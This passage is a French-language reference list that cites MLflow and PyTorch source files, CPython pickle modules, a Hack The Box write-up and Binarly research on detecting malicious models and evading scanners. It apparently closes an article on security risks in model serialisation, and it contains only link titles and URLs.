- [18] [Code source MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST MLflow – points de terminaison de téléchargement et de téléversement d’artefacts](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Taxonomie d’évasion du scanner statique Binarly MLTracer](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – détection de modèles malveillants avec MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Implémentation PyTorch du stockage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Mappage de compatibilité CPython pickle `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Mappage d’importation CPython `_compat_pickle`](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
